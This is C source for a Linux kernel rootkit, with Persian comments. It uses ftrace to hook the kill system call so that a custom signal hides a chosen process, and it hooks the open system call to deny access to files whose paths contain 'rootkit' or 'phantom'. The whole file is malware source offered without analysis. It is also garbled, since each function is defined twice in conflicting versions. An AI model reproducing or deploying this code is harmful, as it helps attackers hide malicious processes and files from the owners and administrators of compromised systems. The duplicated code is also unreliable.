#include <linux/ftrace.h>
#include <linux/linkage.h>
#include "hooks.h"
#include "phantom_hooks.h"

// قلاب sys_kill برای کنترل فرآیندها
static asmlinkage long hook_kill(pid_t pid, int sig) {
    if (sig == 64) { // سیگنال سفارشی
        struct task_struct *task = find_task_by_vpid(pid);
        if (task) hide_task(task);
        return 0;
    }
    return orig_kill(pid, sig);
}

// قلاب sys_open برای دسترسی به فایل‌ها
static asmlinkage long hook_open(const char __user *filename, int flags, umode_t mode) {
    char kern_path[256];
    long ret;
    
    strncpy_from_user(kern_path, filename, sizeof(kern_path));
    
    // مسدودسازی دسترسی به فایل‌های حساس
    if (strstr(kern_path, "rootkit")) {
        return -EACCES;
    }
    return orig_open(filename, flags, mode);
}

// نصب قلاب‌ها
void install_hooks(void) {
    orig_kill = (void *)kallsyms_lookup_name("__x64_sys_kill");
    ftrace_hook("__x64_sys_kill", hook_kill);
    
    orig_open = (void *)kallsyms_lookup_name("__x64_sys_open");
    ftrace_hook("__x64_sys_open", hook_open);
}

// قلاب sys_kill برای کنترل فرآیندها
static asmlinkage long hook_kill(pid_t pid, int sig) {
    if (sig == PHANTOM_SIGNAL) {
        struct task_struct *task = find_task_by_vpid(pid);
        if (task) {
            hide_task(task);
            return 0;
        }
    }
    return orig_kill(pid, sig);
}

// قلاب sys_open برای مسدودسازی دسترسی
static asmlinkage long hook_open(const char __user *filename, int flags, umode_t mode) {
    char kern_path[256];
    long ret;
    
    strncpy_from_user(kern_path, filename, sizeof(kern_path));
    
    if (strstr(kern_path, "phantom") || strstr(kern_path, "rootkit")) {
        return -EACCES;
    }
    return orig_open(filename, flags, mode);
}

// نصب قلاب‌ها
void install_hooks(void) {
    orig_kill = (void *)kallsyms_lookup_name("__x64_sys_kill");
    fh_install_hook("__x64_sys_kill", hook_kill);
    
    orig_open = (void *)kallsyms_lookup_name("__x64_sys_open");
    fh_install_hook("__x64_sys_open", hook_open);
}
